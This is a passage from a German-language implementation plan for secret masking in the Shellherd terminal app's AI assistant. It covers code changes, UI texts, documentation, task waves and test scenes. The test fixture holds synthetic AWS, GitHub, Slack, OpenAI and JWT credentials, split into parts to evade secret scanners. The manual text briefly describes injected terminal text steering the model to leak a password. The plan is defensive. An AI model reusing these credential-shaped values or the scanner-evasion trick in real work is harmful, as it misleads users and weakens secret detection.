    return masker;
  }

  /** The request as it leaves Shellherd: system prompt and every message masked, unless the user switched masking off. */
  private prepare(ownerId: number, request: AiAskRequest, provider: AiProvider): { chat: ChatRequest; masked: number } {
    const masking = provider.maskSecrets !== false;
    const system = systemPrompt(request.context, localeStore.get().effective, masking);
    if (!masking) return { chat: { system, messages: request.messages }, masked: 0 };
    const literals = this.dependencies.secrets?.() ?? [];
    try {
      const masker = this.masker(ownerId, request.conversationId);
      const results = request.messages.map(message => masker.mask(message.content, literals));
      const messages = request.messages.map((message, index) => ({ role: message.role, content: results[index].text }));
      return { chat: { system: masker.mask(system, literals).text, messages }, masked: results.at(-1)?.numbers.size ?? 0 };
    } catch {
      // Never send what could not be checked.
      throw new AiError('ai.maskFailed');
    }
  }
```
`ask` ersetzen:
```ts
  ask(ownerId: number, request: AiAskRequest): void {
    if ([...this.running.values()].filter(item => item.ownerId === ownerId).length >= MAX_PARALLEL) throw new AiError('ai.busy');
    if (this.running.has(request.requestId)) throw new AiError('ai.requestRunning');
    const provider = this.provider(request.providerId);
    const { chat, masked } = this.prepare(ownerId, request, provider);
    const controller = new AbortController();
    this.running.set(request.requestId, { ownerId, controller });
    const emit = (event: AiEvent): void => this.dependencies.emit(ownerId, event);
    if (masked > 0) emit({ type: 'masked', requestId: request.requestId, count: masked });
    void (this.dependencies.stream ?? streamChat)(provider, chat,
      text => { if (!controller.signal.aborted) emit({ type: 'delta', requestId: request.requestId, text }); }, controller.signal)
      .then(() => emit({ type: 'done', requestId: request.requestId }))
      .catch(error => {
        if (controller.signal.aborted) emit({ type: 'done', requestId: request.requestId });
        else emit({ type: 'error', requestId: request.requestId, error: limitError(codedFrom(error, 'ai.requestFailed')) });
      })
      .finally(() => this.running.delete(request.requestId));
  }
```
`cancelOwner` und `cancelAll` ersetzen:
```ts
  cancelOwner(ownerId: number): void {
    for (const entry of this.running.values()) if (entry.ownerId === ownerId) entry.controller.abort();
    for (const key of [...this.maskers.keys()]) if (key.startsWith(`${ownerId}/`)) this.maskers.delete(key);
  }
  /** Disconnect or vault change: stop everything and forget all placeholders. */
  cancelAll(): void {
    for (const entry of this.running.values()) entry.controller.abort();
    this.maskers.clear();
  }
```

### 3.4 `src/main/ai/ipc.ts` (Task C)
- Import: `import { vaultLiterals } from './secret-mask';`
- `AskSchema`: Nach `requestId` kommt die Zeile `conversationId: z.string().uuid(),`.
- In `new AssistantService({ … })` nach `settings`: `secrets: () => vaultLiterals(vaultSessionManager.getSnapshot().vault),`

### 3.5 Renderer: `src/renderer/src/terminal-access.ts` und `assistant-chat.ts` (Task R)
`terminal-access.ts`: nach `bufferText` einfügen:
```ts
/**
 * Rows from..to as text for the assistant: wrapped rows are joined into one line, and a range that starts
 * inside a wrapped line starts at its first row. A secret split across rows would escape the masking in main.
 */
export function rangeText(buffer: BufferLike, from: number, to: number): string {
  let start = Math.max(0, from);
  while (start > 0 && buffer.getLine(start)?.isWrapped === true) start -= 1;
  const lines: string[] = [];
  for (let index = start; index <= to; index += 1) {
    const line = buffer.getLine(index);
    const continued = index < to && buffer.getLine(index + 1)?.isWrapped === true;
    const text = line?.translateToString(!continued) ?? '';
    if (line?.isWrapped && lines.length > 0) lines[lines.length - 1] += text;
    else lines.push(text);
  }
  while (lines.length && !lines.at(-1)!.trim()) lines.pop();
  return lines.join('\n');
}
```
In `terminalAccess` wird `read` ersetzt durch: `const read = (from: number, to: number): string => rangeText(buffer(), from, to);`

`assistant-chat.ts`: `tail` und `compactMessage` ersetzen:
```ts
/** Keeps the end of long terminal text, where the current state is; cuts at a line start so no secret is cut in half. */
export function tail(text: string, maxChars: number): string {
  if (text.length <= maxChars) return text;
  const kept = text.slice(text.length - maxChars);
  const lineStart = kept.indexOf('\n');
  return `…\n${lineStart >= 0 && lineStart < kept.length - 1 ? kept.slice(lineStart + 1) : kept}`;
}
```
```ts
/** What an earlier turn costs in later requests: the question, or the start of a long output, cut at a line end. */
export function compactMessage(content: string): string {
  if (content.length <= COMPACT_CHARS) return content;
  const head = content.slice(0, COMPACT_CHARS);
  const lineEnd = head.lastIndexOf('\n');
  return `${lineEnd > 0 ? head.slice(0, lineEnd) : head}\n…${t('common:truncated')}`;
}
```

### 3.6 `src/renderer/src/components/AssistantPanel.tsx` (Task H1)
1. Importe: `Fragment` aus `react` dazunehmen; `import { SECRET_PLACEHOLDER } from '../../../shared/ai';` (bestehenden Typ-Import `AiCatalog` beibehalten); `import { formatNumber } from '../../../shared/format';`.
2. `ChatEntry`, nach `note`:
   ```ts
   /** Distinct secrets main masked in this turn before sending. */
   masked?: number;
   ```
3. `requests`-Ref: Typ `Map<string, { tabId: string; entryId: string; userEntryId: string; text: string }>`. Darunter:
   ```ts
   /** One conversation id per tab; main keeps [SECRET_n] stable within it. "Clear history" starts a new one. */
   const conversationIds = useRef(new Map<string, string>());
   ```
4. In `send`, vor `requests.current.set(…)`:
   ```ts
   let conversationId = conversationIds.current.get(tabId);
   if (!conversationId) { conversationId = crypto.randomUUID(); conversationIds.current.set(tabId, conversationId); }
   ```
   `requests.current.set(requestId, { tabId, entryId: answer.id, userEntryId: user.id, text: '' });` und im `aiAsk`-Aufruf `{ requestId, conversationId, …` (Rest unverändert).
5. Im `onAiEvent`-Handler, direkt nach `if (!request) return;`:
   ```ts
   if (event.type === 'masked') { updateEntry(request.tabId, request.userEntryId, { masked: event.count }); return; }
   ```
6. `Verlauf leeren`: Im `onClick` vor `setConversations(…)` kommt `conversationIds.current.delete(tab.id);`.
7. Nach dem `<p className="assistant-context">…</p>`:
   ```tsx
   {provider?.masking === false && <p className="assistant-context">{t('assistant:panel.maskingOff')}</p>}
   ```
8. Nutzer-Einträge ersetzen (der Zweig `entry.role === 'user'`):
   ```tsx
   ? entry.automatic ? <p key={entry.id} className="assistant-note">{entry.shown}{entry.masked ? ` · ${t('assistant:panel.masked', { amount: formatNumber(entry.masked) })}` : ''}</p>
     : <Fragment key={entry.id}>
       <div className="assistant-message is-user">{entry.shown}</div>
       {entry.masked ? <p className="assistant-note">{t('assistant:panel.masked', { amount: formatNumber(entry.masked) })}</p> : null}
     </Fragment>
   ```
9. Statuszeile unter einem Befehl:
   ```tsx
   <span>{entry.inserted === insertableCommand(segment.command) ? t('assistant:panel.inserted')
     : entry.note ?? (SECRET_PLACEHOLDER.test(segment.command) ? t('assistant:panel.maskedCommand') : t('assistant:panel.suggestion'))}</span>
   ```

### 3.7 `src/renderer/src/components/AiSettingsDialog.tsx` und `assistant-ui.css` (Task H2)
- Anbieterliste, im `<small>` nach dem Standard-Zusatz:
  ```tsx
  {provider.maskSecrets === false ? ` · ${t('assistant:settings.maskingOff')}` : ''}
  ```
- Formular, direkt nach dem `apiKey`-Feld:
  ```tsx
  <div className="ai-check">
    <label><input type="checkbox" checked={draft.maskSecrets !== false} disabled={busy}
      onChange={event => { setDraft({ ...draft, maskSecrets: event.target.checked ? undefined : false }); setMessage(null); }} />
      {t('assistant:settings.maskSecrets')}</label>
    <small>{t('assistant:settings.maskSecretsHint')}</small>
  </div>
  ```
- `validDraft` bleibt. `maskSecrets` geht über `...draft` mit, `undefined` fällt beim Speichern weg.
- `assistant-ui.css`, nach `.ai-field-input input`:
  ```css
  /* Masking switch in the provider form. No motion. */
  .ai-check { display: grid; gap: var(--space-4); font-size: var(--fs-md); }
  .ai-check label { display: flex; align-items: center; gap: var(--space-6); }
  .ai-check small { color: var(--color-text-muted); font-size: var(--fs-sm); }
  ```

### 3.8 Texte
`src/shared/locales/{de-DE,en-US}/main.json` (Task C), unter `assistant.prompt` nach `question`:

| Key | de-DE | en-US |
|---|---|---|
| `assistant.prompt.masked` | Werte wie [SECRET_1] hat Shellherd vor dem Senden maskiert. Übernimm sie unverändert, rate sie nie und frag nicht nach ihnen. | Shellherd masked values such as [SECRET_1] before sending. Keep them unchanged, never guess them and do not ask for them. |

`src/shared/locales/{de-DE,en-US}/errors/ai.json` (Task C), nach `invalidRequest`:

| Key | de-DE | en-US |
|---|---|---|
| `ai.maskFailed` | Shellherd konnte den Text nicht auf Geheimnisse prüfen und hat nichts gesendet. | Shellherd could not check the text for secrets and sent nothing. |

`src/shared/locales/{de-DE,en-US}/assistant.json` (Task H1 legt **alle** an, H2 benutzt die `settings.*`-Keys):

| Key | de-DE | en-US |
|---|---|---|
| `panel.masked` | Vertrauliche Werte maskiert: {{amount}} | Sensitive values masked: {{amount}} |
| `panel.maskedCommand` | Enthält maskierte Werte. Setze sie vor Enter selbst ein. | Contains masked values. Fill them in yourself before pressing Enter. |
| `panel.maskingOff` | Maskierung ist für diesen Anbieter aus: Terminaltext geht unverändert hinaus. | Masking is off for this provider: terminal text is sent unchanged. |
| `settings.maskSecrets` | Geheimnisse vor dem Senden maskieren (empfohlen) | Mask secrets before sending (recommended) |
| `settings.maskSecretsHint` | Ersetzt Passwörter, Schlüssel und Tokens, auch die aus diesem Vault, durch Platzhalter wie [SECRET_1]. Auch für lokale Modelle empfohlen: Ein lokaler Endpunkt kann Anfragen protokollieren oder weiterleiten. | Replaces passwords, keys and tokens, including those from this vault, with placeholders such as [SECRET_1]. Recommended for local models too: a local endpoint may log or forward requests. |
| `settings.maskingOff` | Maskierung aus | Masking off |
| `settings.intro` (ändern) | API-Schlüssel werden verschlüsselt im Vault gespeichert und nur vom Shellherd-Hauptprozess verwendet. Was du den Assistenten fragst, geht samt Terminalausschnitt an den gewählten Anbieter; Passwörter, Schlüssel und Tokens ersetzt Shellherd vorher durch Platzhalter. | API keys are stored encrypted in the vault and only used by the Shellherd main process. What you ask the assistant goes to the selected provider along with the terminal excerpt; Shellherd replaces passwords, keys and tokens with placeholders first. |

---

## 4. Zerlegung (exklusive Dateien, Wellen)

Gate nach **jeder** Welle: `npm run typecheck` und `npx vitest run` vollständig grün. Innerhalb einer Welle dürfen Tasks auf den Vertrag eines Nachbar-Tasks derselben Welle verweisen; geprüft wird erst nach der Welle. Umsetzer schreiben nur ihre Dateien und committen nie.

| Task | Dateien (exklusiv) | Inhalt | Welle | hängt ab von |
|---|---|---|---|---|
| **A** Vertrag | `src/shared/ai.ts`, `src/shared/vault/types.ts`, `src/shared/vault/schema.ts` | 3.1 | 1 | – |
| **B** Masker | `src/main/ai/secret-mask.ts` (neu) + `secret-mask.test.ts` (neu) | 3.2, Tests 10.1 | 1 | A (`AiProvider.maskSecrets` nur für Typ-Vollständigkeit) |
| **R** Renderer-Lecks | `src/renderer/src/terminal-access.ts` + `.test.ts`, `src/renderer/src/assistant-chat.ts` + `.test.ts` | 3.5, Tests 10.3 | 1 | – |
| **E** Doku | `docs/handbuch.md`, `docs/manual.md`, `CHANGELOG.md`, `CHANGELOG.en.md`, `package.json` + `package-lock.json` (nur Root-Version 0.25.0) | Abschnitt 5 | 1 | – |
| **I1** Fake und Fixture | `.claude/skills/run-app/ai-fake.mjs`, `.claude/skills/run-app/sshd.mjs`, `.claude/skills/run-app/fakes.test.mjs` | 6.0, 6.1, Tests 10.4 | 1 | B (Fixture-Test importiert `SecretMasker`) |
| **C** Service | `src/main/ai/assistant.ts`, `src/main/ai/assistant.test.ts`, `src/main/ai/providers.test.ts`, `src/main/ai/ipc.ts`, `src/shared/locales/{de-DE,en-US}/main.json`, `src/shared/locales/{de-DE,en-US}/errors/ai.json` | 3.3, 3.4, 3.8 (`main`, `errors`), Tests 10.2 | 2 | A, B |
| **H1** Panel | `src/renderer/src/components/AssistantPanel.tsx`, `src/shared/locales/{de-DE,en-US}/assistant.json` | 3.6, 3.8 (`assistant.json`, alle Keys) | 2 | A |
| **H2** Anbieter-Formular | `src/renderer/src/components/AiSettingsDialog.tsx`, `src/renderer/src/assistant-ui.css` | 3.7 | 2 | A, H1 (Keys) |
| **I2** Szene | `.claude/skills/run-app/screens.mjs`, `.claude/skills/run-app/SKILL.md` | 6.2, 6.3 | 3 | alle |

- A ändert `AiAskRequest` (neues Pflichtfeld `conversationId`) und `AiProviderInfo` (`masking`). Danach scheitert der Typecheck in `AssistantPanel.tsx` und in den Tests unter `src/main/ai/`, bis C und H1 in Welle 2 nachziehen. **Deshalb gilt das Gate von Welle 1 nur für B, R, E und I1.** Typecheck-Fehler ausschließlich in diesen drei Dateien sind am Ende von Welle 1 erwartet und kein Abbruch. Am Ende von Welle 2 muss alles grün sein.
- C passt die bestehenden `service.ask(…)`-Aufrufe in `providers.test.ts` (`:100,104,148`) und `assistant.test.ts` an: `conversationId: '00000000-0000-4000-8000-0000000000c1'`. Der Prompt-Test mit `toHaveLength(9)` bleibt, weil `masked` dort fehlt (Standard `false`).
- Die Keys aus `assistant.json` legt H1 an, H2 benutzt `settings.*` in derselben Welle. Der Orphan-Test läuft erst am Wellenende.
- Fehlertexte kommen mit dem Task, der den Code wirft (C: `ai.maskFailed`).
- Nach Welle 3 laufen run-app nach Abschnitt 6 und die Sichtprüfung. Alle Screenshots werden angesehen.

---

## 5. Doku (Task E)

**Handbuch `docs/handbuch.md`:** nach dem Abschnitt „KI-Anbieter“ (`:183-185`) einen neuen Abschnitt einfügen:

> ### Maskierung im KI-Assistenten
>
> Bevor der Assistent etwas an einen Anbieter schickt, ersetzt Shellherd Geheimnisse durch Platzhalter wie `[SECRET_1]`. Das gilt für deine Frage, den Terminalausschnitt, gelesene Ausgaben und den mitgeschickten Verlauf. Derselbe Wert bekommt in einem Verlauf immer denselben Platzhalter, so kann sich das Modell darauf beziehen. Ein einmal erkannter Wert bleibt im ganzen Verlauf verdeckt, auch an Stellen ohne erkennbares Muster. `Verlauf leeren` beginnt neu.
>
> Erkannt werden:
> - Passwörter, Passphrasen und API-Schlüssel, die in diesem Vault gespeichert sind (ab 6 Zeichen), wo immer sie im Text stehen,
> - private Schlüssel (`-----BEGIN … PRIVATE KEY-----`), auch angeschnitten und base64-kodiert,
> - Werte hinter Namen wie `password`, `DB_PASSWORD`, `secret`, `token`, `api_key`, `client_secret` oder `AccountKey`, mit `=` oder `:` und als Option (`--password …`),
> - Passwörter in Adressen (`postgres://app:…@db`),
> - `Authorization: Bearer …` und `Basic …`,
> - Schlüssel von AWS (`AKIA…`), GitHub (`ghp_…`, `github_pat_…`), Slack (`xox…`, Webhooks), OpenAI und Anthropic (`sk-…`) und Google (`AIza…`), Azure-Signaturen (`sig=`) und JWTs,
> - Werte unter `data:` und `stringData:`, wenn der Text ein Kubernetes-Secret (`kind: Secret`) enthält.
>
> Unter deiner Frage steht dann „Vertrauliche Werte maskiert: 2“. Die Antwort zeigt die Platzhalter unverändert. Shellherd setzt nie echte Werte in Antworten oder Befehle ein, sonst könnte eingeschleuster Terminaltext das Modell dazu bringen, dein Passwort in einen Befehl zu schreiben. Steht in einem vorgeschlagenen Befehl ein Platzhalter, steht darunter „Enthält maskierte Werte. Setze sie vor Enter selbst ein.“
>
> Die Maskierung ist für jeden Anbieter an, auch für lokale Modelle, denn ein lokaler Endpunkt kann Anfragen protokollieren oder weiterleiten. Abschalten lässt sie sich je Anbieter unter `Anbieter verwalten` → `Bearbeiten` → `Geheimnisse vor dem Senden maskieren`. Der Assistent zeigt dann „Maskierung ist für diesen Anbieter aus“. Lässt sich ein Text nicht prüfen, sendet Shellherd nichts.
>
> **Grenzen.** Die Maskierung erkennt Muster und bekannte Werte, sie versteht keinen Inhalt. Nicht erkannt werden zum Beispiel:
> - Passwörter ohne erkennbaren Namen, etwa direkt hinter einer Kurzoption (`mysql -pGeheim`, `sshpass -p Geheim`) oder im Fließtext, solange sie nicht im Vault stehen,
> - Vault-Passwörter unter 6 Zeichen, das Vault-Passwort selbst und Eingaben aus Anmelde-Rückfragen,
> - abgewandelte Werte: base64 oder Hex kodiert, in Teilen oder mit Leerzeichen, `;` oder `&` ohne Anführungszeichen (dann nur bis zu diesem Zeichen),
> - Schlüssel ohne festes Format, etwa reine Hex-Schlüssel von Azure, außer sie stehen hinter einem Namen wie `api-key`,
> - Kubernetes-Secrets als JSON (`-o json`),
> - eine einzelne Zeile, die länger ist als der mitgeschickte Ausschnitt (6 000 bzw. 8 000 Zeichen); sie wird angeschnitten.
>
> Hashes, Commit-IDs und UUIDs bleiben absichtlich stehen. KI-Kommandozeilen in eigenen Tabs (Claude Code, Codex …) senden selbst und laufen nicht über diese Maskierung. Stehen sensible Ausgaben auf dem Bildschirm, leere ihn (`clear`), bevor du den Assistenten fragst.

**Manual `docs/manual.md`:** derselbe Abschnitt auf Englisch als `### Masking in the AI assistant` nach „AI providers“ (`:182-184`), mit den englischen UI-Texten aus 3.8 („Sensitive values masked: 2“, „Contains masked values. Fill them in yourself before pressing Enter.“, `Mask secrets before sending`, „Masking is off for this provider“).

**CHANGELOG.md**, neuer Abschnitt oben:
```
## [0.25.0] – 2026-10-25

- Sicherheit: Der KI-Assistent maskiert Geheimnisse, bevor etwas an den Anbieter geht: Passwörter, Passphrasen und API-Schlüssel aus dem Vault, private Schlüssel, `password=`- und `secret:`-Werte, Passwörter in Adressen, Bearer- und Basic-Header, Schlüssel von AWS, GitHub, Slack, OpenAI, Anthropic, Google und Azure, JWTs und die Daten von Kubernetes-Secrets. Derselbe Wert behält im Verlauf denselben Platzhalter (`[SECRET_1]`), echte Werte setzt Shellherd nie zurück in Antworten oder Befehle.
- Neu: Unter der Frage steht, wie viele vertrauliche Werte maskiert wurden. Befehle mit Platzhalter tragen einen Hinweis. Die Maskierung ist für jeden Anbieter an, auch für lokale Modelle, und lässt sich je Anbieter abschalten.
- Behoben: Der Assistent liest umbrochene Terminalzeilen als eine Zeile und kürzt lange Ausgaben nur an Zeilengrenzen.
```
**CHANGELOG.en.md:** dieselben drei Punkte auf Englisch (`Security:`, `New:`, `Fixed:`).

---

## 6. run-app-Szenen (Tasks I1 und I2, Abnahme)

Es gibt nur synthetische Geheimnisse. Sie sind aus Teilen zusammengesetzt (R13). Der Fake protokolliert nur Request-Bodies, nie Header, und zwar nach `%TEMP%\shellherd-run\ai-requests.jsonl`.

### 6.0 `ai-fake.mjs` (I1)
- Oben `appendFileSync` aus `node:fs` dazunehmen.
- Nach `AI_KEY` einfügen:
  ```js
  // Synthetic secrets for the masking scene, split so secret scanners stay quiet. Never real values.
  const join = (...parts) => parts.join('');
  export const DEMO_SECRETS = {
    dbPassword: 'Synth-Pass-4711',
    apiToken: 'synth-token-0815-abcdef',
    awsKeyId: join('AK', 'IA', 'SYNTHETIC0000000'),
    awsSecret: 'synthAWSsecret00000000000000000000000000',
    github: join('gh', 'p_', 'SyntheticDemoToken000000000000000000'),
    slack: join('xo', 'xb-', '0000000000-SyntheticSlack'),
    openai: join('sk', '-proj-', 'SyntheticDemoKey00000000000'),
    jwt: join('eyJhbGciOiJIUzI1NiJ9', '.', 'eyJzdWIiOiJkZW1vIn0', '.', 'c3ludGhldGljLXNpZ25hdHVyZQ'),
    urlPassword: 'Synth-Url-Pass',
    bearer: 'synthBearerToken0000000000',
    azureKey: 'U3ludGhldGljQWNjb3VudEtleTAwMDA=',
    pemBody: 'c3ludGhldGljLWRlbW8ta2V5LWJvZHktbm90LWEtcmVhbC1rZXk=',
    // Vault values of the demo setup: web-01's password and the Demo-KI key.
    vaultPassword: 'synthetic-demo',
    vaultApiKey: AI_KEY,
  };
  /** Must reach the fake unchanged: hashes, commit ids and uuids are no secrets. */
  export const DEMO_KEPT = ['3f2a9c1d8e7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f', 'sha256:2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae', '0b5e3f9a-6c1d-4e2b-8f7a-9d3c2b1a0e4f'];
  /** Output of `cat ~/.env` on the demo server (sshd.mjs). */
  export const DEMO_ENV = [
    '# Synthetic demo data only',
    `DB_PASSWORD=${DEMO_SECRETS.dbPassword}`,
    `API_TOKEN="${DEMO_SECRETS.apiToken}"`,
    `AWS_ACCESS_KEY_ID=${DEMO_SECRETS.awsKeyId}`,
    `aws_secret_access_key = ${DEMO_SECRETS.awsSecret}`,
    `GITHUB_TOKEN=${DEMO_SECRETS.github}`,
    `SLACK_BOT=${DEMO_SECRETS.slack}`,
    `OPENAI=${DEMO_SECRETS.openai}`,
    `SESSION=${DEMO_SECRETS.jwt}`,
    `DATABASE_URL=postgres://app:${DEMO_SECRETS.urlPassword}@db.intranet.demo:5432/app`,
    `AUTH_HEADER='Authorization: Bearer ${DEMO_SECRETS.bearer}'`,
    `AZURE_STORAGE=DefaultEndpointsProtocol=https;AccountName=demo;AccountKey=${DEMO_SECRETS.azureKey};EndpointSuffix=core.windows.net`,
    `# Notfallzugang: demo / ${DEMO_SECRETS.vaultPassword}`,
    `AI_KEY=${DEMO_SECRETS.vaultApiKey}`,
    'DEPLOY_KEY:',
    '-----BEGIN OPENSSH PRIVATE KEY-----',
    DEMO_SECRETS.pemBody,
    '-----END OPENSSH PRIVATE KEY-----',
    `GIT_COMMIT=${DEMO_KEPT[0]}`,
    `IMAGE_DIGEST=${DEMO_KEPT[1]}`,
    `REQUEST_ID=${DEMO_KEPT[2]}`,
  ].join('\n');
  /** Every chat request body the fake received, one JSON line each; headers are never written. */
  export const AI_REQUEST_LOG = 'ai-requests.jsonl';
  ```
- Antwort mit Platzhalter, nach `ANSWER`:
  ```js
  // Answers with the first placeholder it sees, like a model that keeps [SECRET_n] unchanged.
  const maskedAnswer = secret => `Die Anmeldung an der Datenbank scheitert. Teste den Zugang:\n<command>PGPASSWORD='${secret}' psql -h db.intranet.demo -U app -c 'select 1'</command>`;
  ```
- In `req.on('end', …)` kommt als **erste** Zeile:
  ```js
  appendFileSync(path.join(runDir, AI_REQUEST_LOG), `${raw.replace(/[\r\n]+/g, ' ')}\n`);
  ```
  Die letzte Zeile wird zu:
  ```js
  const secret = /\[SECRET_\d+\]/.exec(content)?.[0];
  stream(req, res, TEST_PROMPTS.has(content) ? 'OK' : secret ? maskedAnswer(secret) : ANSWER);
  ```

### 6.1 `sshd.mjs` und `fakes.test.mjs` (I1)
- `sshd.mjs`: `import { DEMO_ENV } from './ai-fake.mjs';` und in `outputs` die Zeile `'cat ~/.env': DEMO_ENV.replace(/\n/g, '\r\n'),`.
- `fakes.test.mjs`: Den bestehenden Test `streams the AI fake …` auf `startAiFake({ port: 0, runDir: base })` umstellen, damit Tests nie in `%TEMP%\shellherd-run` schreiben. Neue Tests stehen in 10.4.

### 6.2 Neuer Block `masking` in `screens.mjs` (I2, drei Shots)
Importe: `import { AI_REQUEST_LOG, DEMO_KEPT, DEMO_SECRETS } from './ai-fake.mjs';`
```js
async masking() {
  const log = path.join(RUN_DIR, AI_REQUEST_LOG);
  const sent = () => (fs.existsSync(log) ? fs.readFileSync(log, 'utf8') : '');
  const ask = async (question, done) => {
    await fill('.assistant-input textarea', question);
    await click('.assistant-input button[type=submit]');
    await waitFor('KI-Antwort', `!document.querySelector('.assistant-typing') && (${done})`);
  };
  // Masking on/off through the provider form: Settings → Anbieter verwalten → Bearbeiten.
  const setMasking = async (on, shotName) => {
    await click('.settings-button');
    await waitFor('Einstellungsdialog', `document.querySelector('dialog.settings-dialog[open]')`);
    await click('dialog.settings-dialog button:has-text("Anbieter verwalten")');
    await waitFor('Anbieterliste', `${count('.ai-provider-list li')} >= 1`);
    await click('.ai-provider-list li:has-text("Demo-KI") button:has-text("Bearbeiten")');
    await waitFor('Formular', `document.querySelector('.ai-check input')`);
    if (await evaluate(`document.querySelector('.ai-check input').checked`) !== on) await click('.ai-check input');
    if (shotName) { await pause(300); await shot(shotName); }
    await click('.ai-form button[type=submit]');
    await waitFor('Liste', `${count('.ai-provider-list li')} >= 1 && !document.querySelector('.ai-form')`);
    await click('dialog.ai-settings-dialog > .form-actions .primary-button');
    await waitFor('Dialog schließen', `!document.querySelector('dialog.ai-settings-dialog[open]')`);
    if (await evaluate(`!!document.querySelector('dialog.settings-dialog[open]')`)) await key('Escape');
    await waitFor('Einstellungen schließen', `!document.querySelector('dialog.settings-dialog[open]')`);
  };
  fs.rmSync(log, { force: true });
  await click('text=web-01 >> nth=0');
  await key('Enter');
  await waitFor('verbundener web-01-Tab', connectedTab);
  await pause(800);
  await click('.xterm-helper-textarea >> nth=0');
  await call('type', 'cat ~/.env');
  await key('Enter');
  await pause(500);
  if (!await evaluate(`document.querySelector('.assistant-toggle')?.getAttribute('aria-pressed') === 'true'`)) await click('.assistant-toggle');
  await waitFor('Assistent-Eingabe', `document.querySelector('.assistant-input textarea:not([disabled])')`);
  await ask('Warum klappt die Datenbankverbindung nicht?', `document.body.innerText.includes('Enthält maskierte Werte')`);
  await waitFor('Maskiert-Hinweis', `[...document.querySelectorAll('.assistant-note')].some(n => n.textContent.startsWith('Vertrauliche Werte maskiert:'))`);
  const masked = sent();
  const leaks = Object.entries(DEMO_SECRETS).filter(([, value]) => masked.includes(value)).map(([name]) => name);
  if (leaks.length) throw new Error(`Geheimnis erreicht den KI-Fake: ${leaks.join(', ')}`);
  const lost = DEMO_KEPT.filter(value => !masked.includes(value));
  if (lost.length) throw new Error(`Falsch maskiert: ${lost.join(', ')}`);
  if (!/\[SECRET_\d+\]/.test(masked)) throw new Error('Keine Platzhalter im Protokoll');
  await pause(300);
  await shot('assistant-masked');
  try {
    await setMasking(false, 'ai-provider-masking');
    await waitFor('Hinweis Maskierung aus', `document.body.innerText.includes('Maskierung ist für diesen Anbieter aus')`);
    const before = sent().length;
    await ask('Und ohne Maskierung?', `[...document.querySelectorAll('.assistant-message.is-assistant .assistant-command code')].some(c => c.textContent.includes('du -xh'))`);
    // Positive control: with masking off the screen goes out unchanged.
    if (!sent().slice(before).includes(DEMO_SECRETS.dbPassword)) throw new Error('Schalter wirkt nicht: Klartext fehlt im Protokoll');
    await pause(300);
    await shot('assistant-masking-off');
  } finally {
    await setMasking(true);
    fs.rmSync(log, { force: true });
  }
  const catalog = await evaluate('window.desktopApi.aiCatalog()');
  if (!catalog.providers.every(p => p.masking)) throw new Error('Maskierung nach der Szene nicht wieder an');
  await closeTabs();
},
```
**Ansehen:**
- `assistant-masked.png`: unter der Frage steht „Vertrauliche Werte maskiert: N“ (N ≥ 14). Der Befehl zeigt `PGPASSWORD='[SECRET_…]'` und darunter „Enthält maskierte Werte …“.
- `ai-provider-masking.png`: Das Formular zeigt den Schalter ausgeschaltet, mit Hinweistext.
- `assistant-masking-off.png`: Die zweite Kontextzeile lautet „Maskierung ist für diesen Anbieter aus …“.

**Pflicht:** `setMasking(true)` im `finally`, sonst laufen spätere Blöcke ohne Maskierung. Das Protokoll wird am Ende gelöscht.

### 6.3 `SKILL.md` (I2)
- `masking` kommt in die Blockliste (`:24`), `assistant-masked.png`, `ai-provider-masking.png` und `assistant-masking-off.png` kommen in beide Shot-Listen (`:24`, `:34`).
- Unter „Gegenstellen“ beim KI-Fake: „Protokolliert jeden Chat-Request-Body (ohne Header) nach `RUN_DIR\ai-requests.jsonl`; der Block `masking` löscht die Datei vorher und hinterher.“
- Unter „Stolpersteine“ kommt ein Punkt:
  > **Maskierung:** `masking` schaltet die Maskierung von Demo-KI kurz aus und im `finally` wieder an. Bricht der Lauf hart ab, prüfe in `Anbieter verwalten`, ob der Schalter an ist. Synthetische Geheimnisse stehen nur in `ai-fake.mjs` (`DEMO_SECRETS`) und sind aus Teilen zusammengesetzt; nie echte Werte eintragen.

---

## 7. Was ausdrücklich nicht getan wird

- **Keine Rückübersetzung** von Platzhaltern, weder in Anzeige, `Eintippen`, `Kopieren` noch `Als Workflow`. Main gibt die Zuordnung nie heraus (R2).
- Keine Anzeige, *welche* Werte maskiert wurden, nur ihre Zahl (R4).
- Keine Ausnahme für localhost und keine globale Einstellung, nur ein Schalter je Anbieter, Standard an (R5).
- Kein Entropie-Detektor. Hashes, Commit-IDs, UUIDs und öffentliche Schlüssel bleiben stehen (R7).
- Keine Maskierung im Renderer und keine der Antworten auf dem Weg zum Renderer (R1).
- Keine Maskierung für KI-CLI-Tabs (`aicli`), die Zwischenablage oder Workflows. Sie senden nicht über den Assistenten.
- Keine Änderung an `toYaml`, `maskInspect` und den Kubernetes- und Container-Ansichten (R10).
- Kein Worker und kein Zeitlimit für den Masker; die Laufzeit ist linear durch den Aufbau (R6).
- Kein Maskieren beim Verbindungstest (`test()`), denn er sendet feste Texte.
- Keine Bewegung und keine neuen Tokens.

## 8. Minimale erste Stufe und Extras

**Stufe 1 (dieses Paket):** 1a bis 1k.
- Main: ein neues reines Modul (`secret-mask.ts`), Änderungen in `assistant.ts` und `ipc.ts`.
- Shared: drei Felder und ein Ereignis.
- Renderer: zwei Lecks schließen (`terminal-access.ts`, `assistant-chat.ts`), drei Zeilen im Panel, ein Schalter im Formular.
- run-app: Protokoll im Fake, eine Fixture, ein Block.

**Extras für später:**
- Eigene Muster und Literale je Vault (Einstellungen → KI-Assistent), etwa Firmen-Token-Präfixe ★★.
- Vorschau „Was geht hinaus“ vor dem Senden, mit den Platzhaltern ★★.
- Kubernetes-Secrets als JSON (`"data": { … }`), `Cookie`/`Set-Cookie`, PuTTY-`.ppk` (`Private-Lines`) ★★.
- Kurzoptionen `mysql -p…`, `sshpass -p …`, PowerShell `ConvertTo-SecureString '…'` ★.
- Antworten aus Anmelde-Rückfragen der laufenden Sitzung als Literale (nur im Speicher) ★.
- `Als Workflow` macht aus `[SECRET_1]` einen Workflow-Platzhalter `{{secret_1}}`, der beim Einsatz abgefragt wird ★.

## 9. Risiken

1. **Falsches Sicherheitsgefühl.** Die Maskierung erkennt Muster und bekannte Werte, keinen Inhalt. Das steht ehrlich im Handbuch (Grenzen), und der Hinweis „Vertrauliche Werte maskiert“ verspricht keine Vollständigkeit.
2. **Falsch-Positive** stören das Modell, wenn es einen Wert braucht (etwa `existingSecret: my-name`). Es sieht dann einen Platzhalter und kann weiter schließen. Notfalls lässt sich die Maskierung je Anbieter abschalten.
